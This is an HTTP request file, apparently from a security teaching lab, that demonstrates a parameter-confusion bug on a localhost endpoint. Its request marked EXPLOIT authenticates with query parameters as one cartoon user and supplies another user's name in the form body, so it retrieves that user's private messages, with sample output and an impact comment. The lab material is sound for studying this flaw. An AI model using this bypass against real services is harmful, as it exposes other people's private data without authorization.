@base = http://localhost:8000/confusion/cross-component-parse

### Expected Usage: SpongeBob retrieves his own messages
GET {{base}}/example3?user=spongebob&password=bikinibottom
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "Hey SpongeBob, wanna go jellyfishing?"
#     }
#   ]
# }

###

### EXPLOIT: Authenticate as SpongeBob but retrieve Squidward's messages
### Middleware checks query params (user=spongebob), handler reads form data (user=squidward)
GET {{base}}/example3?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "squidward",
#       "message": "Dear diary, Mr. Krabs keeps the register key taped under his desk. The morning shift code is 1-9-6-2."
#     },
#     {
#       "from": "art.dealer",
#       "message": "Your painting 'Bold and Brash' has been rejected from the Tentacles Art Gallery. Again."
#     }
#   ]
# }
#
# IMPACT: Plankton learns how to access the cash register and discovers
# Squidward's vulnerable emotional state, making him a prime social engineering
# target. Middleware-handler parameter inconsistency is especially dangerous
# because security and business logic execute in separate architectural layers.
